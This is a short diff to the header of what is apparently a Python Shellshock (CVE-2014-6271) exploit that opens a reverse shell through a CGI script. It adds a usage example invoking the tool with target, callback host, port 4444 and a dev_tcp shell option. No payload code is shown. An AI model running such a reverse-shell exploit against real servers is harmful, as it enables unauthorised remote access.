@@ -1,5 +1,6 @@
 #CVE-2014-6271 cgi-bin reverse shell
-#
+#Pick your shell, any shell
+#example: python shellshock.py -t localhost -u /cgi/test -r localhost -p 4444 -s dev_tcp
  
 import httplib
 import urllib
